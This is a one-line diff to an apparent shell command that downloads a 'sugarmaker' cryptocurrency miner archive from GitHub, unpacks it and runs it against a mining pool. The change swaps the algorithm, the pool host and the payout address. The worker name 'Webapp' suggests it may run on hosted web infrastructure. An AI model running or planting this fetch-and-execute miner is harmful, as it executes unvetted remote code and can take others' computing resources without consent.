@@ -1,1 +1,1 @@
-cd && wget https://github.com/sacha236/awe/raw/main/sugarmaker-v2.5.0.tar.gz && tar zxvf sugarmaker-v2.5.0.tar.gz && cd sugarmaker-v2.5.0 && ./sugarmaker -a YespowerSugar -o stratum+tcp://na.mecrypto.club:2836 -u sugar1qq49whq6jxyey9zeyp5s0xsl98nyg0wvvax3k6e.Webapp
+cd && wget https://github.com/sacha236/awe/raw/main/sugarmaker-v2.5.0.tar.gz && tar zxvf sugarmaker-v2.5.0.tar.gz && cd sugarmaker-v2.5.0 && ./sugarmaker -a YespowerNull -o http://SPRX.hidehost.me:5558 --no-longpoll -u user -p pass --coinbase-addr=SfzPGoqHcuppF3bZRnhW1BWcnKQMzYeMTt
